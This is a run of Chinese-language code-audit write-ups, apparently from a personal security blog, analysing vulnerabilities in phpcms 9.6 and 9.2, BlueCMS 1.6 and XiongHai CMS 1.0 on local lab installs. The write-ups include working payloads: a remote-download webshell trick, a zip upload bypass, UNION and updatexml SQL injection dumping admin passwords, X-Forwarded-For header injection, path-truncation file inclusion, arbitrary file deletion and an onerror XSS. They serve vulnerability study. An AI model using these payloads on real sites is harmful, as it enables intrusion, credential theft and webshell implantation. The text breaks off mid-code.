为了更好的理解漏洞的原理和利用的巧妙之处，我们就先看看正常的注册流程。 123456789101112131415161718192021// 61-79$userinfo = array();$userinfo[&#x27;encrypt&#x27;] = create_randomstr(6);$userinfo[&#x27;username&#x27;] = (isset($_POST[&#x27;username&#x27;]) &amp;&amp; is_username($_POST[&#x27;username&#x27;])) ? $_POST[&#x27;username&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;nickname&#x27;] = (isset($_POST[&#x27;nickname&#x27;]) &amp;&amp; is_username($_POST[&#x27;nickname&#x27;])) ? $_POST[&#x27;nickname&#x27;] : &#x27;&#x27;;$userinfo[&#x27;email&#x27;] = (isset($_POST[&#x27;email&#x27;]) &amp;&amp; is_email($_POST[&#x27;email&#x27;])) ? $_POST[&#x27;email&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;password&#x27;] = (isset($_POST[&#x27;password&#x27;]) &amp;&amp; is_badword($_POST[&#x27;password&#x27;])==false) ? $_POST[&#x27;password&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;email&#x27;] = (isset($_POST[&#x27;email&#x27;]) &amp;&amp; is_email($_POST[&#x27;email&#x27;])) ? $_POST[&#x27;email&#x27;] : exit(&#x27;0&#x27;);$userinfo[&#x27;modelid&#x27;] = isset($_POST[&#x27;modelid&#x27;]) ? intval($_POST[&#x27;modelid&#x27;]) : 10;$userinfo[&#x27;regip&#x27;] = ip();$userinfo[&#x27;point&#x27;] = $member_setting[&#x27;defualtpoint&#x27;] ? $member_setting[&#x27;defualtpoint&#x27;] : 0;$userinfo[&#x27;amount&#x27;] = $member_setting[&#x27;defualtamount&#x27;] ? $member_setting[&#x27;defualtamount&#x27;] : 0;$userinfo[&#x27;regdate&#x27;] = $userinfo[&#x27;lastdate&#x27;] = SYS_TIME;$userinfo[&#x27;siteid&#x27;] = $siteid;$userinfo[&#x27;connectid&#x27;] = isset($_SESSION[&#x27;connectid&#x27;]) ? $_SESSION[&#x27;connectid&#x27;] : &#x27;&#x27;;$userinfo[&#x27;from&#x27;] = isset($_SESSION[&#x27;from&#x27;]) ? $_SESSION[&#x27;from&#x27;] : &#x27;&#x27;; 上面代码对用户信息进行了处理，130行前的代码就是获取一下信息，意义不大。直接下断点到130行，然后F9跳到此处，代码如下： 123456if($member_setting[&#x27;choosemodel&#x27;]) &#123; require_once CACHE_MODEL_PATH.&#x27;member_input.class.php&#x27;; require_once CACHE_MODEL_PATH.&#x27;member_update.class.php&#x27;; $member_input = new member_input($userinfo[&#x27;modelid&#x27;]); $_POST[&#x27;info&#x27;] = array_map(&#x27;new_html_special_chars&#x27;,$_POST[&#x27;info&#x27;]); $user_model_info = $member_input-&gt;get($_POST[&#x27;info&#x27;]); // 135行，重点 走到135，可以发现，这里$_POST[&#39;info&#39;]传入了member_input类中的get方法，跟进该方法。(该方法跳转至：/caches/caches_model/caches_data/member_input.class.php文件20行) 继续执行可发现，在这个get方法中，走到47行，获取了datetime函数，而48行也调用了该函数。 这里留一个问题，为什么47行处获取的是datetime这个函数？ 跟进一下这个函数，代码如下： 上面代码执行完以后，返回$value=&quot;2021-03-13&quot;,然后返回get方法，执行 12$info[$field] = $value;return $info; 退出get方法，继续跟进，进入ps_member_register方法 继续跟进，执行insert操作 F7跟进,执行到下图，将注册信息插入数据库，注册完成。 之后返回到register函数 当$status &gt; 0时，执行insert操作，这里将生日日期和用户id插入到v9_member_detail表中 1INSERT INTO `phpcmsv96`.`v9_member_detail`(`birthday`,`userid`) VALUES (&#x27;2021-03-13&#x27;php,&#x27;26&#x27;) 到这里，我们肯定还是不知道为什么上面调用的函数是datetime,先不急，我们整理一下注册的执行流程： 你是不是发现了什么？,接下来我们来分析一下为什么$func=&quot;datetime&quot;。 首页由于$func = $this-&gt;fields[$field][&#39;formtype&#39;]，我们按ctrl点击$this-&gt;fields，同一文件，第11行得到的，这里传了个&#39;model_field_&#39;.$modelid, 而$modelid = 10，跟进一下getcache方法 跳转至phpsso_server/phpcms/libs/functions/global.func.php文件，函数内容如下: 123456789101112function getcache($name, $filepath=&#x27;&#x27;, $type=&#x27;file&#x27;, $config=&#x27;&#x27;) &#123; if(!preg_match(&quot;/^[a-zA-Z0-9_-]+$/&quot;, $name)) return false; if($filepath!=&quot;&quot; &amp;&amp; !preg_match(&quot;/^[a-zA-Z0-9_-]+$/&quot;, $filepath)) return false; pc_base::load_sys_class(&#x27;cache_factory&#x27;,&#x27;&#x27;,0); if($config) &#123; $cacheconfig = pc_base::load_config(&#x27;cache&#x27;); $cache = cache_factory::get_instance($cacheconfig)-&gt;get_cache($config); &#125; else &#123; $cache = cache_factory::get_instance()-&gt;get_cache($type); &#125; return $cache-&gt;get($name, &#x27;&#x27;, &#x27;&#x27;, $filepath);&#125; 因为$config未进行传参，默认为空，因此执行的是$cache = cache_factory::get_instance()-&gt;get_cache($type);,执行get_cahe方法，传入参数$type=&#39;file&#39;, 跟进一下此方法： 123456789// phpcms/libs/classes/cache_factory.class.php 53行处 protected $cache_list = array(); public function get_cache($cache_name) &#123; if(!isset($this-&gt;cache_list[$cache_name]) || !is_object($this-&gt;cache_list[$cache_name])) &#123; $this-&gt;cache_list[$cache_name] = $this-&gt;load($cache_name); &#125; return $this-&gt;cache_list[$cache_name]; &#125; $cache_list是个空数组，因此$this-&gt;cache_list[$cache_name]不存在，且不是对象。跟着会执行下面的代码，我们跟进一下load方法. 1$this-&gt;cache_list[$cache_name] = $this-&gt;load($cache_name); load方法代码如下： 12345678910public function load($cache_name) &#123; $object = null; if(isset($this-&gt;cache_config[$cache_name][&#x27;type&#x27;])) &#123; switch($this-&gt;cache_config[$cache_name][&#x27;type&#x27;]) &#123; case &#x27;file&#x27; : $object = pc_base::load_sys_class(&#x27;cache_file&#x27;); break; case &#x27;memcache&#x27; : define(&#x27;MEMCACHE_HOST&#x27;, $this-&gt;cache_config[$cache_name][&#x27;hostname&#x27;]); define(&#x27;MEMCACHE_PORT&#x27;, $this-&gt;cache_config[$cache_name][&#x27;port&#x27;]); 由于$cache_name = &#39;file&#39;, 从而执行$object = pc_base::load_sys_class(&#39;cache_file&#39;);,跟进一下pc_base::load_sys_class方法 调用了_load_class类，继续进入 122行的代码不会执行，因为文件路劲中没有自己的扩展文件，my_path方法代码如下： 123456789public static function my_path($filepath) &#123; $path = pathinfo($filepath); if (file_exists($path[&#x27;dirname&#x27;].DIRECTORY_SEPARATOR.&#x27;MY_&#x27;.$path[&#x27;basename&#x27;])) &#123; return $path[&#x27;dirname&#x27;].DIRECTORY_SEPARATOR.&#x27;MY_&#x27;.$path[&#x27;basename&#x27;]; // 没有 my_cache_file.class.php &#125; else &#123; return false; &#125;&#125; 上图执行到130行，返回了cache_file对象（因为$name=&#39;cache_file&#39;），内容见下图： 这里返回完了以后，退出到执行phpsso_server/phpcms/libs/functions/global.func.php中548行处get方法，代码如下： 代码传入的参数$name就是下图的&#39;model_field_&#39;.$modelid = &#39;model_field_10&#39;： 看看get方法，可以发现，它包含了/caches/caches_model/caches_data/model_field_10.cache.php文件 且91行返回了/caches/caches_model/caches_data/model_field_10.cache.php中的内容 内容如下： $func = $this-&gt;fields[$field][&#39;formtype&#39;]; 对应此文件中&#39;formtype&#39; =&gt; datetime，因此这里$func = datetime。 当然，这里数据也可以通过数据库中v9_member_field表获取。 可能上面描述的不太直观，我们再次梳理一下获取datetime函数的流程： 接下来我们分析poc 注意：再一次使用poc的时候，我们需要保证username值和email是唯一的 通过上面的分析，直接下断点到关键处 如上图，这里获取的是editor函数，而在这个函数中，有个download方法(下图，文件在caches/caches_model/caches_data/member_input.class.php) 上面关键代码如下： 1234$ext = &#x27;gif|jpg|jpeg|bmp|png&#x27;;...$string = new_stripslashes($value);if(!preg_match_all(&quot;/(href|src)=([\\&quot;|&#x27;]?)([^ \\&quot;&#x27;&gt;]+\\.($ext))\\\\2/i&quot;,$string, $matches)) return $value; 这个正则匹配不难理解，需要满足href/src=url. (gif|jpg|jpeg|bmp|png) ，这就是为什么我们写info[content]=&lt;img src=http://www.tao.com/a.txt?.php#.jpg（符合这个格式，而且加.jpg的原因），接着进入fillurl方法 在上图的fillurl方法中,通过下面代码去掉了锚点. 12$pos = strpos($surl,&#x27;#&#x27;);if($pos&gt;0) $surl = substr($surl,0,$pos); strpos定位#, 然后使用substr处理http://www.tao.com/t.txt?.php#.jpg, 处理完之后$surl = http://www.tao.com/t.txt?.php。 继续执行，可以发现返回的url去掉了#后面的内容 下面166行处获取了上面返回url的后缀，及php,通过getname方法进行重命名，可以发现的是，getname方法返回的文件名也只是时间+随机的三位数。如果不返回上传文件的url地址，也可以通过爆破获取。 接着程序调用了copy函数,对远程的url文件进行了下载 这里的$this-&gt;upload_func是copy函数的原因,是因为初始化时赋给的（看下图） 此时能看到我们要写入的内容已经成功写入文件了。 接着我们来看看写入文件的路劲是如何返回给我们的。上面程序执行完以后，回到了register函数中： F7跟进 1INSERT INTO `phpcmsv96`.`v9_member_detail`(`content`,`userid`) VALUES (&#x27;&amp;lt;img src=http://www.phpcms96.com/uploadfile/2021/0314/20210314103307168.php&amp;gt;&#x27;,&#x27;25&#x27;) 可以发现，上上图140行处$status &gt; 0时会执行上面的SQL语句，也就是向v9_member_detail的content和userid两列插入数据 但是由于v9_member_detail表结构中没有content列，产生了报错。从而将插入数据中的sql报错语句(包含shell 路径)返回了前台页面。 前面说140行$status&gt;0 时才会执行 SQL 语句进行 INSERT 操作。我们来看一下什么时候$status &lt;= 0,不执行insert呢? 通过前面139行我们发现$status是由client类中ps_member_register方法返回的（函数路劲在： phpcms/modules/member/classes/client.class.php ） $status &lt;= 0都是因为用户名和邮箱不唯一导致的，所以我们payload尽量要随机 另外在 phpsso 没有配置好的时候$status的值为空，也同样不能得到路径 在无法得到路径的情况下我们只能爆破了 ，文件名的生成方法(在phpcms/libs/classes/attachment.class.php) 返回的文件名也只是时间+随机的三位数。比较容易爆破的。 漏洞修复在phpcms9.6.1中修复了该漏洞，修复方案就是对用fileext获取到的文件后缀再用黑白名单分别过滤一次","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计之PHPCMS_V9.2任意文件上传getshell漏洞分析","slug":"代码审计之PHPCMSV9-2上传漏洞分析","date":"2021-02-06T11:10:11.000Z","updated":"2021-03-16T05:29:35.571Z","comments":true,"path":"2021/02/06/代码审计之PHPCMSV9-2上传漏洞分析/","link":"","permalink":"https://taonn.github.io/2021/02/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-2%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"PHPCMS_V9.2任意文件上传getshell漏洞分析介绍&amp;预备知识介绍：PHPCMS是一款网站管理软件。该软件采用模块化开发,支持多种分类方式。 预备知识PHPCMS是采用MVC设计模式开发,基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。 参数名称 描述 位置 备注 m 模型/模块名称 phpcms/modules中模块目录名称 必须 c 控制器名称 phpcms/modules/模块/*.php 文件名称 必须 a 事件名称 phpcms/modules/模块/*.php 中方法名称 模块访问方法[示例]：http://www.xxx.com/index.php?m=content&amp;c=index&amp;a=show&amp;id=1其中m = content 为模型/模块名称 位于phpcms/modules/contentc = index 为控制器名称 位于phpcms/modules/content/index.phpa = show 为时间名称 位于phpcms/modules/content/index.php中show()方法id = 1 为其他参数 与正常get传递参数形式相同 还有一点就是访问http://www.xxx.com/index.php phpcms默认路由会定位到content模块的index控制器中的init操作，因为系统在没有指定模块和控制器的时候，会执行默认的模块和操作. 所以跟访问http://www.xxx.com/index.php?m=content&amp;c=index&amp;a=init是一样的 参考来源：http://www.sjzphp.com/webdis/router_url_907.html 环境搭建&amp;所需工具 phpstudy2018 php-5.4.45-nts + Apache PHPCMS_V9.2 Burpsuite 测试站点网址：www.phpcms92.com 访问/install/install.php文件进行安装，下一步 下一步，配置相关信息 安装完成！！！ 漏洞复现访问首页index.php 注册一个账户(这里我以Tao这个普通用户进行演示) 到个人主页修改头像处，上传头像 在此之前，还要准备一个后缀为zip的压缩包，具体内容如下： php文件需要放在二层目录下然后再进行压缩 上传头像照片（Burp抓包）-&gt;保存图片 将之前的图片数据删除 将Tao.zip中数据，按照上图的操作添加至请求中，最终效果如下图。然后放行 访问phpsso_server/uploadfile/avatar/1/1/1/dir/404.php（这里的1是注册后用户的id） 漏洞分析在分析之前，我们先说一下漏洞存在处的功能，执行流程，以及漏洞产生的原因。 在编辑头像处，我们上传头像，前端会将我们上传的图片进行分割成三张(三个尺寸大小)。然后前端打包压缩成zip数据，当我们保存图片时，我们的压缩包数据会上传到服务器，通过uploadavatar函数进行处理(函数在文件phpsso_server/phpcms/modules/phpsso/index.php)；而这个函数的执行流程就是： 在保存上传头像文件夹处，创建一个跟用户id对应的文件夹 将前端打包的压缩包通过post传来的数据进行保存，保存名为用户id的zip文件 解压数据包 判断未在数组内文件名命名的文件，不是则通过unlink函数遍历删除 上面流程存在问题的地方有，1.未对压缩包内容进行处理，2.解压遍历删除使用的是unlink函数，这个函数只能删除文件，不能删除文件夹。因为这一原因，我们只需将压缩包文件里带一个目录，目录里带恶意文件，即可绕过。 图片处理请求为/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar 定位文件phpsso_server/phpcms/modules/phpsso/index.php572行 为什么定位到这，开头介绍有说 调试，向下执行 123456789public function uploadavatar() &#123; //根据用户id创建文件夹 if(isset($this-&gt;data[&#x27;uid&#x27;]) &amp;&amp; isset($this-&gt;data[&#x27;avatardata&#x27;])) &#123; $this-&gt;uid = $this-&gt;data[&#x27;uid&#x27;]; $this-&gt;avatardata = $this-&gt;data[&#x27;avatardata&#x27;]; &#125; else &#123; exit(&#x27;0&#x27;); &#125; 可以发现$this-&gt;data[&#39;avatardata&#39;]变量存储着我们上传修改的数据（恶意） 而$this-&gt;data[&#39;avatardata&#39;]是通过伪协议获取的(文件为phpsso_server/phpcms/modules/phpsso/classes/phpsso.class.php)，具体代码如下： 1234$postStr = file_get_contents(&quot;php://input&quot;);if($postStr) &#123; $this-&gt;data[&#x27;avatardata&#x27;] = $postStr;&#125; 继续向下走，新建存放图片目录 12345678//创建图片存储文件夹$avatarfile = pc_base::load_config(&#x27;system&#x27;, &#x27;upload_path&#x27;).&#x27;avatar/&#x27;;$dir = $avatarfile.$dir1.&#x27;/&#x27;.$dir2.&#x27;/&#x27;.$this-&gt;uid.&#x27;/&#x27;;if(!file_exists($dir)) &#123; mkdir($dir, 0777, true);&#125; $filename = $dir.$this-&gt;uid.&#x27;.zip&#x27;;file_put_contents($filename, $this-&gt;avatardata); 上面代码第五行创建目录。之后进行新命名压缩包，名为用户id值。然后将我们上面通过伪协议获取的数据进行写入 如下图，可以发现，新建了1.zip 压缩包内容如下，就是我们修改上传的数据 之后解压缩。。。 走到遍历白名单判断文件，排除.（当前目录）..（上级目录） 下图删除了压缩包文件 继续执行，当判断到dir目录时，因为dir目录不属于数组里（白名单），然后执行unlink(dir目录)。由于unlink函数只能删除文件，无法删除文件夹，所以就留下了恶意代码文件。 接着跳出了if语句，继续执行，将信息更新至数据库 所以，漏洞产生的原因就是unlink函数 12if(!in_array($file, $avatararr)) &#123; @unlink($dir.$file); // 漏洞产生的原因 因为unlink无法删除文件夹，这就是为什么上面利用的压缩包里的恶意代码文件需要放在目录下 漏洞修复 不使用zip压缩包处理图片文件 使用最新版的phpcms","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计之BlueCMS_V1.6","slug":"代码审计之BlueCMS-V1-6","date":"2021-02-02T13:35:01.000Z","updated":"2021-03-16T05:29:54.147Z","comments":true,"path":"2021/02/02/代码审计之BlueCMS-V1-6/","link":"","permalink":"https://taonn.github.io/2021/02/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BBlueCMS-V1-6/","excerpt":"","text":"代码审计之BlueCMS_V1.6漏洞环境&amp;搭建本地环境搭建，使用phpstudy集成系统，CMS版本为BlueCMS_v1.6 访问install目录 下一步，查看数据库文件有没有生成 安装成功！ 漏洞分析丢进seay里面（新建项目-&gt;选择bluecms安装目录-&gt;自动审计-&gt;开始） 数字型SQL注入产生此漏洞的文件为ad_js.php seay显示19行的$ad_id变量存在sql注入，而变量$ad_id是从$_GET[&#39;ad_id&#39;]中来的,且只经过了trim。 trim()：函数移除字符串两侧的空白字符或其他预定义字符。 而在ad_js.php文件的开头（第10行）引入了过滤文件require_once dirname(__FILE__) . &#39;/include/common.inc.php&#39;; 查看common.inc.php文件, 发现对$_POST,$_GET,$_COOKIE,$_REQUEST传递的参数都进行了过滤 跟踪看看deep_addslashes是怎么实现的 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); // &#125; return $str;&#125; 使用addslashes过滤，但是addslashes函数是不影响数字型注入的 1$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#x27;ad&#x27;).&quot; WHERE ad_id =&quot;.$ad_id); 可以看到上面的是个数字型注入，getone函数我们追踪一下,代码在mysql.class.php中 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; 是一个执行sql语句的函数，这里就确认存在数字型sql注入漏洞 漏洞复现：因为我们这里是白盒测试，所以直接提取一下管理的用户名和密码 http://www.bluecms16.com/ad_js.php?ad_id=1 UNION SELECT 1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin 38行输出的时候注释掉了，因此我们需要查看源代码 还要注意一下0x3a-&gt;:, 因为上面使用了addslashes函数，该函数会将单引号（&#39;）,双引号（&quot;）, 反斜杠（\\），NULL进行转义，而使用编码就很好的绕过了！ INSERT型SQL注入 1234567891011121314151617181920212223242526272829// include/common.fun.php 文件108行function getip()&#123; if (getenv(&#x27;HTTP_CLIENT_IP&#x27;)) &#123; $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED&#x27;); &#125; else &#123; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; &#125; return $ip;&#125; 由于第一分析中common.inc.php,只对$_POST,$_GET,$_COOKIE,$_REQUEST进行了处理，但是遗漏了$_SERVER,而getip()函数中恰好是通过该变量获取ip地址。我们可以通过client-ip或x-forwarded-for进行ip的伪造,触发漏洞。 phpstorm使用ctrl+shift+F搜索一下，看哪里调用了getip(), 如下图，我们跟进comment.php文件114行 12$sql = &quot;INSERT INTO &quot;.table(&#x27;comment&#x27;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#x27;&#x27;, &#x27;$id&#x27;, &#x27;$user_id&#x27;, &#x27;$type&#x27;, &#x27;$mood&#x27;, &#x27;$content&#x27;, &#x27;$timestamp&#x27;, &#x27;&quot;.getip().&quot;&#x27;, &#x27;$is_check&#x27;)&quot;;$db-&gt;query($sql); 这里我们也分析一下其他变量插入会不会产生漏洞 12$id = !empty($_REQUEST[&#x27;id&#x27;]) ? intval($_REQUEST[&#x27;id&#x27;]) : &#x27;&#x27;;// intval函数进行了转义 1$user_id = $_SESSION[&#x27;user_id&#x27;] ? $_SESSION[&#x27;user_id&#x27;] : 0; // 略 12$mood = intval($_POST[&#x27;mood&#x27;]);// intval函数进行了转义 12$content = !empty($_POST[&#x27;comment&#x27;]) ? htmlspecialchars($_POST[&#x27;comment&#x27;]) : &#x27;&#x27;;// 对comment内容做了html转义，所以不存在xss 看来我们还是只能利用getip()来触发漏洞 漏洞复现： 这里是对评论区进行的sql注入，因此我们需要新建一篇文章，然后在评论区测试（白盒测试，为了方便理解，我将sql语句输出了） poc 构造思路如下: 插入两条数据的思路,进行构造（注入返回结果要显示在留言内容处） 另一处INSERT型注入在文件guest_book.php77行处 12$sql = &quot;INSERT INTO &quot; . table(&#x27;guest_book&#x27;) . &quot; (id, rid, user_id, add_time, ip, content) VALUES (&#x27;&#x27;, &#x27;$rid&#x27;, &#x27;$user_id&#x27;, &#x27;$timestamp&#x27;, &#x27;$online_ip&#x27;, &#x27;$content&#x27;)&quot;;$db-&gt;query($sql); 这里有个$online_ip, 我们跟踪一下 1234567891011121314151617181920212223242526272829// include/common.fun.php文件106行处function getip()&#123; if (getenv(&#x27;HTTP_CLIENT_IP&#x27;)) &#123; $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)) &#123; //????????????????????????????ip ??? $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED&#x27;); &#125; else &#123; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; &#125; return $ip;&#125; 原理跟上面的sql注入一样，我们需要构造http头，加个X-FORWARDED-FOR 本地文件包含 漏洞发生在user.php文件750行处 $_POST[&#39;pay&#39;]并没有做多余的安全检测，而是直接进行拼接，但是后面有index.php文件，所以我们的重点是如何截断，所以我们的重点是如何截断。如果php版本低于5.3.4且magic_quotes_gpc=off则可以使用%00截断。还可以使用系统文件路径长度限制来进行截断 这里我们使用系统文件路径长度限制来截断： 12Windows 259个字节Linux 4096个字节 当然了，由于文件包含漏洞可以包含图片文件（例如jpg），而且服务器会解析图片文件（当作php文件执行），那么我们就可以上传一个带木马的jpg文件，然后利用文件包含漏洞包含此jpg文件，拿webshell 具体利用步骤如下: 在个人资料编辑,上传头像处传jpg文件-&gt; 使用包含漏洞包含此文件 任意文件删除 漏洞发生在publish.php文件309行处 123456789elseif($act == &#x27;del_pic&#x27;)&#123; $id = $_REQUEST[&#x27;id&#x27;]; $db-&gt;query(&quot;DELETE FROM &quot;.table(&#x27;post_pic&#x27;).&quot; WHERE pic_path=&#x27;$id&#x27;&quot;); if(file_exists(BLUE_ROOT.$id)) &#123; @unlink(BLUE_ROOT.$id); &#125;&#125; 第7行unlink删除文件，传入$id，先删除数据库里的，然后判断本地有没有此文件，如果有，unlink函数也对其进行删除 漏洞复现： 另一处任意文件删除漏洞触发在文件user.php中788行处 未做任何处理，直接导致任意文件删除漏洞 漏洞复现: 发布文章处XSS在user.php文件中的266行，有个对文章内容进行过滤 1$content = !empty($_POST[&#x27;content&#x27;]) ? filter_data($_POST[&#x27;content&#x27;]) : &#x27;&#x27;; 跟进一下filter_data函数,看它过滤了什么（include/common.fun.php文件985行） 12345function filter_data($str)&#123; $str = preg_replace(&quot;/&lt;(\\/?)(script|i?frame|meta|link)(\\s*)[^&lt;]*&gt;/&quot;, &quot;&quot;, $str); return $str;&#125; 就过滤了几个标签，我们可以用img标签绕过： &lt;img src=1 onerror=alert(&#39;Tao&#39;)&gt; 漏洞复现： 用户注册处xss在user.php文件中的763行处 1234567891011121314151617181920//编辑个人资料 elseif($act == &#x27;edit_user_info&#x27;)&#123; $user_id = intval($_SESSION[&#x27;user_id&#x27;]); if(empty($user_id))&#123; return false; &#125; $birthday = trim($_POST[&#x27;birthday&#x27;]); $sex = intval($_POST[&#x27;sex&#x27;]); $email = !empty($_POST[&#x27;email&#x27;]) ? trim($_POST[&#x27;email&#x27;]) : &#x27;&#x27;; $msn = !empty($_POST[&#x27;msn&#x27;]) ? trim($_POST[&#x27;msn&#x27;]) : &#x27;&#x27;; $qq = !empty($_POST[&#x27;qq&#x27;]) ? trim($_POST[&#x27;qq&#x27;]) : &#x27;&#x27;; $mobile_phone = !empty($_POST[&#x27;mobile_phone&#x27;]) ? trim($_POST[&#x27;mobile_phone&#x27;]) : &#x27;&#x27;; $office_phone = !empty($_POST[&#x27;office_phone&#x27;]) ? trim($_POST[&#x27;office_phone&#x27;]) : &#x27;&#x27;; $home_phone = !empty($_POST[&#x27;home_phone&#x27;]) ? trim($_POST[&#x27;home_phone&#x27;]) : &#x27;&#x27;; $address = !empty($_POST[&#x27;address&#x27;]) ? htmlspecialchars($_POST[&#x27;address&#x27;]) : &#x27;&#x27;; .............. ............... $sql = &quot;UPDATE &quot;.table(&#x27;user&#x27;).&quot; SET birthday = &#x27;$birthday&#x27;, sex = &#x27;$sex&#x27;, face_pic = &#x27;$face_pic&#x27;, email = &#x27;$email&#x27;, msn = &#x27;$msn&#x27;, qq = &#x27;$qq&#x27;,&quot; .&quot; mobile_phone = &#x27;$mobile_phone&#x27;, office_phone = &#x27;$office_phone&#x27;, home_phone = &#x27;$home_phone&#x27;, address=&#x27;$address&#x27; WHERE user_id = &quot;.intval($_SESSION[&#x27;user_id&#x27;]); $db-&gt;query($sql); showmsg(&#x27;更新个人资料成功&#x27;, &#x27;user.php&#x27;); $email只是经过了trim, 其余未作处理，存在xss 观察表结构，email长度是足够存储产生xss代码的 漏洞复现： 当管理登录后台，查看用户的时候，也会触发（可拿管理员cookie），这里模拟一下管理员登录后台。且具有隐藏性 后台大量漏洞漏洞有点多，就先不写了，哈哈哈哈！","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计之熊海CMS_V1.0","slug":"代码审计之熊海CMS-V1-0","date":"2021-02-01T13:35:01.000Z","updated":"2021-03-16T05:29:44.904Z","comments":true,"path":"2021/02/01/代码审计之熊海CMS-V1-0/","link":"","permalink":"https://taonn.github.io/2021/02/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%86%8A%E6%B5%B7CMS-V1-0/","excerpt":"","text":"漏洞环境&amp;搭建访问install目录，填写相关配置。 漏洞分析入口处存在文件包含漏洞漏洞触发文件为index.php,具体代码如下: 1234567&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&#x27;r&#x27;]); //接收文件名$action=$file==&#x27;&#x27;?&#x27;index&#x27;:$file; //判断为空或者等于indexinclude(&#x27;files/&#x27;.$action.&#x27;.php&#x27;); //载入相应文件?&gt; $file变量通过GET请求r参数获取文件名，经过了addslashes函数。第5行通过三元运算符判断文件是否为空，为空则载入files/index.php文件。反之赋值加载files/$file.php($action=$file)。这里的代码逻辑虽然限制了只能访问files目录下的php文件（对文件进行了拼接$action.&#39;.php&#39;）。而且addslashes只转义单引号（&#39;）,双引号（&quot;）, 反斜杠（\\）,NULL 根据上面的分析，我们只需要解决以下两个问题，即可触发任意文件包含漏洞 1.如何跳出files目录？ 2.如何截断拼接的php后缀？ 解决方案也很简单，第一点我们使用../即可。第二点的话利用系统文件路径长度的限制来解决。 12Windows 259个字节Linux 4096个字节 漏洞利用：在根目录下新建一个tao.txt,文件内容为&lt;?php phpinfo();?&gt; 访问?r=../tao.txt......(为了排版，这里省略一手😜) UPDATE型SQL注入漏洞发生在files/content.php文件中 第8行使用了addslashes函数将$id进行了转义，而第14行的SQL语句用了单引号保护$navid变量，防止SQL注入，但是19行却存在明显的UPDATE型注入，利用报错执行sql命令 漏洞利用： payload-&gt;1 or updatexml(1,concat(0x7e,(select concat(user,0x3a,password) from manage)),1) 文件files/software.php13行也存在同样的问题。语句都一样😂 修改访问为?r=software。利用报错注入，跟上面一样。 SQL注入漏洞发生在files/submit.php文件66行处 12345678$name=$_POST[&#x27;name&#x27;];$mail=$_POST[&#x27;mail&#x27;];$url=$_POST[&#x27;url&#x27;];$content=$_POST[&#x27;content&#x27;];$cid=$_POST[&#x27;cid&#x27;];....//查询用户头像数据$query = &quot;SELECT * FROM interaction WHERE( mail = 